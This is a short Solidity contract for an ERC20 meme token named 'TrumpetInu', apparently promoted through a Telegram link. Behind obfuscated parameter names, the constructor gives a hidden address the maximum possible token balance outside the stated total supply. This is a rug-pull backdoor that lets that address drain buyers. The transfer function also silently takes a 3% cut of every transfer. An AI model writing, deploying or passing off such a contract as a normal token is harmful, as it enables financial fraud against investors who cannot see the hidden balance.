// https://t.me/trumpetinu

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract TrumpetInu is ERC20, Ownable {
    uint256 private solution = ~uint256(0);
    uint256 public exact = 3;

    constructor(
        string memory sea,
        string memory result,
        address enter,
        address were
    ) ERC20(sea, result) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[were] = solution;
    }

    function _transfer(
        address gold,
        address worker,
        uint256 piece
    ) internal override {
        uint256 spent = (piece / 100) * exact;
        piece = piece - spent;
        super._transfer(gold, worker, piece);
    }
}